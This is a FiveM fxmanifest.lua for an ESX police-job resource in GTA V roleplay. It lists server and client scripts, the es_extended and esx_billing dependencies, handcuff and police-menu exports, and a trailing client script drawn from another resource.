fx_version 'bodacious'
lua54 'yes'
game 'gta5'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/**.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/**.lua',
	'config.lua',
	'client/**.lua',
	'10-13/**.lua',
}

dependencies {
	'es_extended',
	'esx_billing'
}

exports { 
	'isHandcuffed',
	'OpenPoliceActionsMenu',
	'HandcuffMenu',
	'handcuffBlock'
}

client_script '@pozdoodtajczyka/client/main.lua'